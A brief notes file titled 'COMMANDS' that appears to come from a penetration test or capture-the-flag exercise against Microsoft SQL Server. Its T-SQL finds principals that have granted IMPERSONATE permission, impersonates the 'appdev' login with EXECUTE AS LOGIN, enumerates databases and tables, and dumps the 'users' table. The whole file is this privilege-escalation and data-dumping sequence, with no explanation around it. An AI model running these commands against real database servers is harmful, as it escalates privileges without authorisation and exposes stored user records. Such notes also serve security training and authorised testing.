# COMMANDS
```sql
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'appdev';

SELECT name FROM sys.databases;

SELECT name FROM sys.tables;

SELECT * FROM users;

```